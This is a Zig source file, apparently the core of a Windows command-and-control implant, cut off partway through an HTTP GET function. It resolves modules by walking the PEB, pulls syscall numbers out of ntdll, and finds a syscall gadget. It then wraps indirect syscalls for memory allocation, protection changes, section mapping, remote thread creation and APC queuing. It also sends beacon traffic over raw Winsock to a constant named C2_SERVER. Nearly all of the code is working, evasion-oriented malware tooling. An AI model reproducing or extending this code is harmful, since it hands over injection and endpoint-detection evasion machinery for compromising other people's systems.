const std = @import("std");
const C2_SERVER = "127.0.0.1:3000"; 

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// WINDOWS STRUCTS
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

const PEB = extern struct {
    Reserved1: [2]u8,
    BeingDebugged: u8,
    Reserved2: [21]u8,
    Ldr: *PEB_LDR_DATA,
};

const PEB_LDR_DATA = extern struct {
    Reserved1: [8]u8,
    Reserved2: [3]*anyopaque,
    InMemoryOrderModuleList: LIST_ENTRY,
};

const LIST_ENTRY = extern struct {
    Flink: *LIST_ENTRY,
    Blink: *LIST_ENTRY,
};

const LDR_DATA_TABLE_ENTRY = extern struct {
    Reserved1: [2]*anyopaque,
    InMemoryOrderLinks: LIST_ENTRY,
    Reserved2: [2]*anyopaque,
    DllBase: *anyopaque,
    Reserved3: [2]*anyopaque,
    FullDllName: UNICODE_STRING,
};

const UNICODE_STRING = extern struct {
    Length: u16,
    MaximumLength: u16,
    Buffer: [*:0]u16,
};

const IMAGE_DOS_HEADER = extern struct {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [4]u16,
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [10]u16,
    e_lfanew: i32,
};

const IMAGE_FILE_HEADER = extern struct {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
};

const IMAGE_DATA_DIRECTORY = extern struct {
    VirtualAddress: u32,
    Size: u32,
};

const IMAGE_OPTIONAL_HEADER64 = extern struct {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [16]IMAGE_DATA_DIRECTORY,
};

const IMAGE_NT_HEADERS64 = extern struct {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_SECTION_HEADER = extern struct {
    Name: [8]u8,
    Misc: extern union {
        PhysicalAddress: u32,
        VirtualSize: u32,
    },
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
};

const IMAGE_IMPORT_DESCRIPTOR = extern struct {
    OriginalFirstThunk: u32,
    TimeDateStamp: u32,
    ForwarderChain: u32,
    Name: u32,
    FirstThunk: u32,
};

const OBJECT_ATTRIBUTES = extern struct {
    Length: u32,
    RootDirectory: ?*anyopaque,
    ObjectName: ?*UNICODE_STRING,
    Attributes: u32,
    SecurityDescriptor: ?*anyopaque,
    SecurityQualityOfService: ?*anyopaque,
};


const STARTUPINFOW = extern struct {
    cb: u32,
    lpReserved: ?[*:0]u16,
    lpDesktop: ?[*:0]u16,
    lpTitle: ?[*:0]u16,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: ?*u8,
    hStdInput: ?*anyopaque,
    hStdOutput: ?*anyopaque,
    hStdError: ?*anyopaque,
};

const PROCESS_INFORMATION = extern struct {
    hProcess: ?*anyopaque,
    hThread: ?*anyopaque,
    dwProcessId: u32,
    dwThreadId: u32,
};

const SECURITY_ATTRIBUTES = extern struct {
    nLength: u32,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: i32,
};


const SOCKET = usize;
const SOCKADDR_IN = extern struct {
    sin_family: u16,
    sin_port: u16,
    sin_addr: u32,
    sin_zero: [8]u8,
};

const WSADATA = extern struct {
    wVersion: u16,
    wHighVersion: u16,
    iMaxSockets: u16,
    iMaxUdpDg: u16,
    lpVendorInfo: ?[*]u8,
    szDescription: [257]u8,
    szSystemStatus: [129]u8,
};

const LARGE_INTEGER = extern struct {
    QuadPart: i64,
};


// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// PEB WALKING & MODULE RESOLUTION
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn getPEB() *anyopaque {
    return asm volatile (
        \\mov %gs:0x60, %rax
        : [ret] "={rax}" (-> *anyopaque),
    );
}

fn endsWithUtf16(haystack: []const u16, needle: []const u16) bool {
    if (haystack.len < needle.len) return false;
    const start = haystack.len - needle.len;
    for (haystack[start..], needle) |h, n| {
        const h_lower = if (h >= 'A' and h <= 'Z') h + 32 else h;
        const n_lower = if (n >= 'A' and n <= 'Z') n + 32 else n;
        if (h_lower != n_lower) return false;
    }
    return true;
}

fn findModule(module_name: []const u16) ?*anyopaque {
    const peb_ptr = getPEB();
    const peb: *PEB = @ptrCast(@alignCast(peb_ptr));
    const ldr = peb.Ldr;
    var current = ldr.InMemoryOrderModuleList.Flink;
    const head = &ldr.InMemoryOrderModuleList;
    
    while (current != head) {
        const entry: *LDR_DATA_TABLE_ENTRY = @fieldParentPtr("InMemoryOrderLinks", current);
        const dll_name = entry.FullDllName.Buffer[0..entry.FullDllName.Length / 2];
        if (endsWithUtf16(dll_name, module_name)) {
            return entry.DllBase;
        }
        current = current.Flink;
    }
    return null;
}

fn addOffset(base: *anyopaque, offset: usize) *anyopaque {
    return @ptrFromInt(@intFromPtr(base) + offset);
}

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// SYSCALL RESOLUTION & GADGET FINDING
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn syscall_resolver(syscall: []const u8) u16 {
    const ntdll_name = [_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
    const ntdll_base = findModule(&ntdll_name).?;
    const bytes: [*]u8 = @ptrCast(ntdll_base);
    
    // hardcoded offsets ik ik this was made before I imported the structs
    const e_lfanew_ptr: *u32 = @ptrCast(@alignCast(&bytes[0x3C]));
    const e_lfanew = e_lfanew_ptr.*;
    const optional_header_offset = addOffset(ntdll_base, e_lfanew + 24);
    const data_dir = addOffset(optional_header_offset, 112);
    const data_dir_bytes: [*]u8 = @ptrCast(data_dir);
    const export_rva_ptr: *u32 = @ptrCast(@alignCast(&data_dir_bytes[0]));
    const export_rva = export_rva_ptr.*;
    const export_dir = addOffset(ntdll_base, export_rva);
    
    const num_names_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 24)));
    const num_names = num_names_ptr.*;
    const names_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 32)));
    const funcs_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 28)));
    const ords_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 36)));
    
    const names_array: [*]u8 = @ptrCast(addOffset(ntdll_base, names_rva_ptr.*));
    const funcs_array: [*]u8 = @ptrCast(addOffset(ntdll_base, funcs_rva_ptr.*));
    const ords_array: [*]u8 = @ptrCast(addOffset(ntdll_base, ords_rva_ptr.*));
    
    var syscall_number: u16 = 0;
    for (0..num_names) |i| {
        const name_rva_ptr: *u32 = @ptrCast(@alignCast(&names_array[i * 4]));
        const name_rva = name_rva_ptr.*;
        const name_ptr: [*:0]const u8 = @ptrCast(addOffset(ntdll_base, name_rva));
        const name = std.mem.span(name_ptr);
        
        if (std.mem.eql(u8, name, syscall)) {
            const ord_ptr: *u16 = @ptrCast(@alignCast(&ords_array[i * 2]));
            const func_rva_ptr: *u32 = @ptrCast(@alignCast(&funcs_array[ord_ptr.* * 4]));
            const func_ptr: [*]u8 = @ptrCast(addOffset(ntdll_base, func_rva_ptr.*));
            
            for (0..20) |j| {
                if (func_ptr[j] == 0xb8) {
                    const ssn_ptr: *u16 = @ptrCast(@alignCast(&func_ptr[j + 1]));
                    syscall_number = ssn_ptr.*;
                    break;
                }
            }
            break;
        }
    }
    return syscall_number;
}

fn find_text_section(ntdll_base: *anyopaque) ?struct { base: u32, size: u32 } {
    const bytes: [*]u8 = @ptrCast(ntdll_base);
    const e_lfanew_ptr: *u32 = @ptrCast(@alignCast(&bytes[0x3C]));
    const e_lfanew = e_lfanew_ptr.*;
    const pe_header = addOffset(ntdll_base, e_lfanew);
    const pe_bytes: [*]u8 = @ptrCast(pe_header);
    
    const num_sections_ptr: *u16 = @ptrCast(@alignCast(&pe_bytes[0x06]));
    const num_sections = num_sections_ptr.*;
    const opt_header_size_ptr: *u16 = @ptrCast(@alignCast(&pe_bytes[0x14]));
    const opt_header_size = opt_header_size_ptr.*;
    const section_headers_offset = e_lfanew + 4 + 20 + opt_header_size;
    
    for (0..num_sections) |i| {
        const section_offset = section_headers_offset + (i * 40);
        const section_bytes: [*]u8 = @ptrCast(addOffset(ntdll_base, section_offset));
        const name = section_bytes[0..8];
        
        if (name[0] == '.' and name[1] == 't' and name[2] == 'e' and
            name[3] == 'x' and name[4] == 't')
        {
            const virtual_size_ptr: *u32 = @ptrCast(@alignCast(&section_bytes[8]));
            const virtual_addr_ptr: *u32 = @ptrCast(@alignCast(&section_bytes[12]));
            return .{ .base = virtual_addr_ptr.*, .size = virtual_size_ptr.* };
        }
    }
    return null;
}

fn find_syscall_gadget(ntdll_base: *anyopaque) ?*anyopaque {
    const text_section = find_text_section(ntdll_base) orelse return null;
    const code_start: [*]u8 = @ptrCast(addOffset(ntdll_base, text_section.base));
    
    var i: usize = 0;
    while (i < text_section.size - 2) : (i += 1) {
        if (code_start[i] == 0x0F and code_start[i + 1] == 0x05 and code_start[i + 2] == 0xC3) {
            return addOffset(ntdll_base, text_section.base + i);
        }
    }
    return null;
}

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// INDIRECT SYSCALLS 
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn nt_allocate_virtual_memory_indirect(
    process_handle: isize,
    base_address: *?*anyopaque,
    zero_bits: usize,
    region_size: *usize,
    allocation_type: u32,
    protect: u32,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtAllocateVirtualMemory");
    var status: i32 = undefined;

    asm volatile (
        \\subq $0x48, %%rsp
        \\movq %[p5], 0x20(%%rsp)
        \\movq %[p6], 0x28(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x48, %%rsp
        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
          [gadget] "r" (syscall_gadget),
          [p1] "{rcx}" (process_handle),
          [p2] "{rdx}" (@intFromPtr(base_address)),
          [p3] "{r8}" (zero_bits),
          [p4] "{r9}" (@intFromPtr(region_size)),
          [p5] "r" (@as(u64, allocation_type)),
          [p6] "r" (@as(u64, protect)),
        : "r10", "r11", "memory"
    );

    return status;
}

fn nt_protect_virtual_memory_indirect(
    process_handle: isize,
    base_address: *?*anyopaque,
    region_size: *usize,
    new_protect: u32,
    old_protect: *u32,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtProtectVirtualMemory");
    var status: i32 = undefined;

    asm volatile (
        \\subq $0x40, %%rsp
        \\movq %[p5], 0x20(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x40, %%rsp
        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
          [gadget] "r" (syscall_gadget),
          [p1] "{rcx}" (process_handle),
          [p2] "{rdx}" (@intFromPtr(base_address)),
          [p3] "{r8}" (@intFromPtr(region_size)),
          [p4] "{r9}" (new_protect),
          [p5] "r" (@as(usize, @intFromPtr(old_protect))),
        : "r10", "r11", "memory"
    );
    return status;
}

fn nt_create_section_indirect(
    section_handle: *?*anyopaque,
    desired_access: u32,
    object_attributes: ?*OBJECT_ATTRIBUTES,
    maximum_size: *usize,
    section_page_protection: u32,
    allocation_attributes: u32,
    file_handle: ?*anyopaque,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtCreateSection");
    var status: i32 = undefined;

    asm volatile (
        \\subq $0x40, %%rsp
        \\movl %[p5], 0x20(%%rsp)
        \\movl %[p6], 0x28(%%rsp)
        \\movq %[p7], 0x30(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x40, %%rsp
        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
          [gadget] "r" (syscall_gadget),
          [p1] "{rcx}" (@intFromPtr(section_handle)),
          [p2] "{rdx}" (desired_access),
          [p3] "{r8}" (@intFromPtr(object_attributes)),
          [p4] "{r9}" (@intFromPtr(maximum_size)),
          [p5] "r" (section_page_protection),
          [p6] "r" (allocation_attributes),
          [p7] "r" (@intFromPtr(file_handle)),
        : "r10", "r11", "memory"
    );
    return status;
}

fn nt_map_view_of_section_indirect(
    section_handle: ?*anyopaque,
    process_handle: ?*anyopaque,
    base_address: *?*anyopaque,
    zero_bits: usize,
    commit_size: usize,
    section_offset: ?*i64,
    view_size: *usize,
    inherit_disposition: u32,
    allocation_type: u32,
    win32_protect: u32,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtMapViewOfSection");
    var status: i32 = undefined;

    asm volatile (
        \\subq $0x58, %%rsp
        \\movq %[p5], 0x20(%%rsp)
        \\movq %[p6], 0x28(%%rsp)
        \\movq %[p7], 0x30(%%rsp)
        \\movl %[p8], 0x38(%%rsp)
        \\movl %[p9], 0x40(%%rsp)
        \\movl %[p10], 0x48(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x58, %%rsp
        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
          [gadget] "r" (syscall_gadget),
          [p1] "{rcx}" (@intFromPtr(section_handle)),
          [p2] "{rdx}" (@intFromPtr(process_handle)),
          [p3] "{r8}" (@intFromPtr(base_address)),
          [p4] "{r9}" (zero_bits),
          [p5] "r" (commit_size),
          [p6] "r" (@intFromPtr(section_offset)),
          [p7] "r" (@intFromPtr(view_size)),
          [p8] "r" (inherit_disposition),
          [p9] "r" (allocation_type),
          [p10] "r" (win32_protect),
        : "r10", "r11", "memory"
    );
    return status;
}

fn nt_unmap_view_of_section_indirect(
    ProcessHandle: ?*anyopaque,
    BaseAddress: ?*anyopaque,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtUnmapViewOfSection");
    var status: i32 = undefined;

    asm volatile(
        \\subq $0x28, %%rsp
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x28, %%rsp

        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
        [gadget] "r" (syscall_gadget),
        [p1] "{rcx}" (@intFromPtr(ProcessHandle)),
        [p2] "{rdx}" (@intFromPtr(BaseAddress)),
        : "r10", "r11", "memory"
    );
    return status;
}

// Just for testing
fn nt_create_thread_ex_indirect(
    ThreadHandle: *?*anyopaque,
    DesiredAccess: u32,
    ObjectAttributes: ?*OBJECT_ATTRIBUTES,
    ProcessHandle: ?*anyopaque,
    StartRoutine: *anyopaque,
    Argument: ?*anyopaque,
    CreateFlags: u32,
    ZeroBits: usize,
    StackSize: usize,
    MaximumStackSize: usize,
    AttributeList: ?*anyopaque,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtCreateThreadEx");
    var status: i32 = undefined;

    asm volatile(
        \\subq $0x60, %%rsp
        \\movq %[p5], 0x20(%%rsp)
        \\movq %[p6], 0x28(%%rsp)
        \\movl %[p7], 0x30(%%rsp)
        \\movq %[p8], 0x38(%%rsp)
        \\movq %[p9], 0x40(%%rsp)
        \\movq %[p10], 0x48(%%rsp)
        \\movq %[p11], 0x50(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x60, %%rsp

        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
        [gadget] "r" (syscall_gadget),
        [p1] "{rcx}" (@intFromPtr(ThreadHandle)),
        [p2] "{rdx}" (DesiredAccess),
        [p3] "{r8}" (@intFromPtr(ObjectAttributes)),
        [p4] "{r9}" (@intFromPtr(ProcessHandle)),
        [p5] "r" (@intFromPtr(StartRoutine)),
        [p6] "r" (@intFromPtr(Argument)),
        [p7] "r" (CreateFlags),
        [p8] "r" (ZeroBits),
        [p9] "r" (StackSize),
        [p10] "r" (MaximumStackSize),
        [p11] "r" (@intFromPtr(AttributeList)),
        : "r10", "r11", "memory"
    );
    return status;
}

fn nt_wait_for_single_object(
    Handle: ?*anyopaque,
    Alertable: u8,
    Timeout: ?*LARGE_INTEGER,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtWaitForSingleObject");
    var status: i32 = undefined;

    asm volatile(
        \\subq $0x28, %%rsp
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x28, %%rsp

        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
        [gadget] "r" (syscall_gadget),
        [p1] "{rcx}" (Handle),
        [p2] "{rdx}" (Alertable),
        [p3] "{r8}" (Timeout),
        : "r10", "r11", "memory"
    );
    return status;
}

fn nt_close(
    Handle: ?*anyopaque,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtClose");
    var status: i32 = undefined;

    asm volatile(
        \\subq $0x28, %%rsp
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x28, %%rsp

        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
        [gadget] "r" (syscall_gadget),
        [p1] "{rcx}" (Handle),
        : "r10", "r11", "memory" 
    );
    return status;
}


// Not yet in use
fn nt_queue_apc_thread_indirect(
    ThreadHandle: ?*anyopaque,
    ApcRoutine: *anyopaque,  
    ApcArgument1: ?*anyopaque,
    ApcArgument2: ?*anyopaque,
    ApcArgument3: ?*anyopaque,
    syscall_gadget: *anyopaque,
) i32 {
    const ssn = syscall_resolver("NtQueueApcThread");
    var status: i32 = undefined;

    asm volatile(
        \\subq $0x30, %%rsp
        \\movq %[p5], 0x20(%%rsp)
        \\movq %%rcx, %%r10
        \\movl %[ssn], %%eax
        \\call *%[gadget]
        \\addq $0x30, %%rsp

        : [ret] "={rax}" (status),
        : [ssn] "r" (@as(u32, ssn)),
        [gadget] "r" (syscall_gadget),
        [p1] "{rcx}" (ThreadHandle),
        [p2] "{rdx}" (ApcRoutine),
        [p3] "{r8}" (ApcArgument1),
        [p4] "{r9}" (ApcArgument2),
        [p5] "r" (ApcArgument3),
        : "r10", "r11", "memory"
    ) ;
    return status;
}


// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// EXPORT RESOLUTION (WITH FORWARDER SUPPORT)
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn resolve_export(dll_base: *anyopaque, func_name: []const u8) ?*anyopaque {
    const bytes: [*]u8 = @ptrCast(dll_base);
    const e_lfanew_ptr: *u32 = @ptrCast(@alignCast(&bytes[0x3C]));
    const e_lfanew = e_lfanew_ptr.*;

    const optional_header_offset = addOffset(dll_base, e_lfanew + 24);
    const data_dir = addOffset(optional_header_offset, 112);
    const data_dir_bytes: [*]u8 = @ptrCast(data_dir);
    const export_rva_ptr: *u32 = @ptrCast(@alignCast(&data_dir_bytes[0]));
    const export_rva = export_rva_ptr.*;
    const export_size_ptr: *u32 = @ptrCast(@alignCast(&data_dir_bytes[4]));
    const export_size = export_size_ptr.*;

    const export_dir = addOffset(dll_base, export_rva);
    const num_names_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 24)));
    const num_names = num_names_ptr.*;

    const names_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 32)));
    const funcs_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 28)));
    const ords_rva_ptr: *u32 = @ptrCast(@alignCast(addOffset(export_dir, 36)));

    const names_array: [*]u8 = @ptrCast(addOffset(dll_base, names_rva_ptr.*));
    const funcs_array: [*]u8 = @ptrCast(addOffset(dll_base, funcs_rva_ptr.*));
    const ords_array: [*]u8 = @ptrCast(addOffset(dll_base, ords_rva_ptr.*));

    for (0..num_names) |i| {
        const name_rva_ptr: *u32 = @ptrCast(@alignCast(&names_array[i * 4]));
        const name_ptr: [*:0]const u8 = @ptrCast(addOffset(dll_base, name_rva_ptr.*));
        const name = std.mem.span(name_ptr);

        if (std.mem.eql(u8, name, func_name)) {
            const ord_ptr: *u16 = @ptrCast(@alignCast(&ords_array[i * 2]));
            const func_rva_ptr: *u32 = @ptrCast(@alignCast(&funcs_array[ord_ptr.* * 4]));
            const func_rva = func_rva_ptr.*;

            if (func_rva >= export_rva and func_rva < (export_rva + export_size)) {
                const forwarder_str: [*:0]const u8 = @ptrCast(addOffset(dll_base, func_rva));
                const forwarder = std.mem.span(forwarder_str);

                var it = std.mem.splitScalar(u8, forwarder, '.');
                const target_dll_name = it.next() orelse return null;
                const target_func_name = it.next() orelse return null;

                var target_dll_buf: [256]u8 = undefined;
                const target_dll_full = std.fmt.bufPrint(&target_dll_buf, "{s}.dll", .{target_dll_name}) catch return null;

                var dll_wide: [256]u16 = undefined;
                for (target_dll_full, 0..) |c, idx| {
                    dll_wide[idx] = c;
                }

                if (findModule(dll_wide[0..target_dll_full.len])) |target_base| {
                    return resolve_export(target_base, target_func_name);
                }

                return null;
            }

            return addOffset(dll_base, func_rva);
        }
    }

    return null;
}

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// HELPER FUNCTIONS 
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn htons(hostshort: u16) u16 {
    return ((hostshort & 0xFF) << 8) | ((hostshort >> 8) & 0xFF);
}

fn inet_addr(cp: [*:0]const u8) u32 {
    // Simple parser for "127.0.0.1" format. Will change later
    var result: u32 = 0;
    var byte_val: u32 = 0;
    var byte_count: u32 = 0;
    var i: usize = 0;
    
    while (cp[i] != 0) : (i += 1) {
        if (cp[i] >= '0' and cp[i] <= '9') {
            byte_val = byte_val * 10 + (cp[i] - '0');
        } else if (cp[i] == '.') {
            result |= (byte_val << @intCast(byte_count * 8));
            byte_val = 0;
            byte_count += 1;
        }
    }
    result |= (byte_val << @intCast(byte_count * 8));
    return result;
}

fn buildUrl(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
    return std.fmt.allocPrint(allocator, "{s}{s}", .{C2_SERVER, path});
}

fn unescapePath(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
    var result = std.ArrayList(u8).init(allocator);
    var i: usize = 0;
    while (i < path.len) {
        if (i + 1 < path.len and path[i] == '\\' and path[i + 1] == '\\') {
            try result.append('\\');
            i += 2;
        } else {
            try result.append(path[i]);
            i += 1;
        }
    }
    return result.toOwnedSlice();
}


// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// HTTP COMMUNICATION VIA WINSOCK
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

fn initWinsock() !void {
    // Loading ws2_32.dll first
    const kernel32_name = [_]u16{'k','e','r','n','e','l','3','2','.','d','l','l'};
    const kernel32_base = findModule(&kernel32_name).?;

    const LoadLibraryA = @as(*const fn([*:0]const u8) callconv(.C) ?*anyopaque, 
        @ptrCast(resolve_export(kernel32_base, "LoadLibraryA").?));
    
    _ = LoadLibraryA("ws2_32.dll");  
    
    const ws2_32_name = [_]u16{'w','s','2','_','3','2','.','d','l','l'};
    const ws2_32_base = findModule(&ws2_32_name) orelse return error.WS2_32NotFound;
    
    const WSAStartup = @as(*const fn(u16, *WSADATA) callconv(.C) i32, 
        @ptrCast(resolve_export(ws2_32_base, "WSAStartup").?));
    
    var wsa_data: WSADATA = undefined;
    const result = WSAStartup(0x0202, &wsa_data);
    if (result != 0) return error.WSAStartupFailed;
}

fn sendHttpPost(allocator: std.mem.Allocator, url: []const u8, body: []const u8) ![]u8 {
    
    const ws2_32_name = [_]u16{'w','s','2','_','3','2','.','d','l','l'};
    const ws2_32_base = findModule(&ws2_32_name).?;
    
    const socket_fn = @as(*const fn(i32, i32, i32) callconv(.C) SOCKET, @ptrCast(resolve_export(ws2_32_base, "socket").?));
    const connect_fn = @as(*const fn(SOCKET, *const SOCKADDR_IN, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "connect").?));
    const send_fn = @as(*const fn(SOCKET, [*]const u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "send").?));
    const recv_fn = @as(*const fn(SOCKET, [*]u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "recv").?));
    const closesocket_fn = @as(*const fn(SOCKET) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "closesocket").?));
    
    // Parse URL (format: "host:port/path")
    var buffer: [32]u8 = undefined;
    var len: usize = 0;
    
    var path: []const u8 = "/";
    var host: []const u8 = undefined;
    var port: []const u8 = undefined;

    for (url, 0..) |byte, i| {
        if (byte == '/') {
            path = url[i..];
            break;
        }
        buffer[len] = byte;
        len += 1;
    }

    const host_port = buffer[0..len];

    for (host_port, 0..) |b, index| {
        if (b == ':') {
            host = host_port[0..index];
            port = host_port[index + 1..];
            break;
        }
    }

    const port_num = try std.fmt.parseInt(u16, port, 10);
  

    var host_z: [32:0]u8 = undefined;
    @memcpy(host_z[0..host.len], host);
    host_z[host.len] = 0;
    
    const sock = socket_fn(
        2, 
        1, 
        0,
     ); 
    if (sock == ~@as(usize, 0)) return error.SocketCreationFailed;
    defer _ = closesocket_fn(sock);
    
    const server_addr = SOCKADDR_IN{
        .sin_family = 2, 
        .sin_port = htons(port_num),
        .sin_addr = inet_addr(@ptrCast(&host_z)),
        .sin_zero = [_]u8{0} ** 8,
    };
    
    if (connect_fn(sock, &server_addr, @sizeOf(SOCKADDR_IN)) != 0) {
        return error.ConnectionFailed;
    }
    
    var request = std.ArrayList(u8).init(allocator);
    defer request.deinit();
    
    try request.writer().print(
        "POST {s} HTTP/1.1\r\n" ++
        "Host: {s}:{s}\r\n" ++
        "Content-Type: application/json\r\n" ++
        "Content-Length: {d}\r\n" ++
        "Connection: close\r\n" ++
        "\r\n" ++
        "{s}",
        .{ path, host, port, body.len, body }
    );
    
    var sent: usize = 0;
    while (sent < request.items.len) {
        const n = send_fn(sock, request.items.ptr + sent, @intCast(request.items.len - sent), 0);
        if (n <= 0) return error.SendFailed;
        sent += @intCast(n);
    }
    
    var response = std.ArrayList(u8).init(allocator);
    defer response.deinit();
    
    var buf: [4096]u8 = undefined;
    while (true) {
        const n = recv_fn(sock, &buf, buf.len, 0);
        if (n <= 0) break;
        try response.appendSlice(buf[0..@intCast(n)]);
    }
    
    const response_str = response.items;
    if (std.mem.indexOf(u8, response_str, "\r\n\r\n")) |body_start| {
        const body_content = response_str[body_start + 4..];
        return allocator.dupe(u8, body_content);
    }
    
    return allocator.dupe(u8, "");
}

fn sendHttpGet(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
    
    const ws2_32_name = [_]u16{'w','s','2','_','3','2','.','d','l','l'};
    const ws2_32_base = findModule(&ws2_32_name).?;
    
    const socket_fn = @as(*const fn(i32, i32, i32) callconv(.C) SOCKET, @ptrCast(resolve_export(ws2_32_base, "socket").?));
    const connect_fn = @as(*const fn(SOCKET, *const SOCKADDR_IN, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "connect").?));
    const send_fn = @as(*const fn(SOCKET, [*]const u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "send").?));
    const recv_fn = @as(*const fn(SOCKET, [*]u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "recv").?));
    const closesocket_fn = @as(*const fn(SOCKET) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "closesocket").?));
    
    // Parse URL (format: "host:port/path")
    var buffer: [32]u8 = undefined;
    var len: usize = 0;
    
    var path: []const u8 = "/";
    var host: []const u8 = undefined;
    var port: []const u8 = undefined;

    for (url, 0..) |byte, i| {
        if (byte == '/') {
            path = url[i..];
            break;
        }
        buffer[len] = byte;
        len += 1;
    }

    const host_port = buffer[0..len];

    for (host_port, 0..) |b, index| {
        if (b == ':') {
            host = host_port[0..index];
            port = host_port[index + 1..];
            break;
        }
    }

    const port_num = try std.fmt.parseInt(u16, port, 10);

    var host_z: [32:0]u8 = undefined;
    @memcpy(host_z[0..host.len], host);
    host_z[host.len] = 0;
